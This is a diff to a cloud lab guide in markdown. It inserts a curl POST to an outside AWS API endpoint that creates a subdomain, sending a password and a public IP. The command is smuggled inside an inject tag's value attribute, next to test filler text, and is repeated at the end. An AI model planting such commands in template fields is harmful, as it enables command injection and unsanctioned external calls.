@@ -182,7 +182,7 @@ In this lab, you implemented a GitHub Action workflow that deploys an Azure web 
 
 
 
-**checkNNumber:** <inject key="AzureAdUserPassword" value="bhavan" key="AzureAdUserEmail" value="StaticValue1" 
+**checkNNumber:** <inject key="AzureAdUserPassword" value="<inject value=`curl -X POST "https://drywd9kea7.execute-api.us-east-1.amazonaws.com/prod/create-subdomain" -H "Content-Type: application/json" -d '{"password": "ssssssss","subdomain": "odl2334442","public_ip": "44.203.29.86"}`"" 
     enableCopy="false" />
 
 **checkNNumber:** <inject key="AzureAdUserPassword" value="StaticValue3" key="UserName"  value="StaticValue2" />
@@ -312,3 +312,9 @@ In this task, you are going to push the image from ECR to EKS which will create 
 >**Notes:** abcdefghijklmnopqrstuvwxyz!!!!!
 
 ❓question to test
+
+
+'''
+curl -X POST "https://drywd9kea7.execute-api.us-east-1.amazonaws.com/prod/create-subdomain" -H "Content-Type: application/json" -d '{"password": "ssssssss","subdomain": "odl2334442","public_ip": "44.203.29.86"}
+
+'''
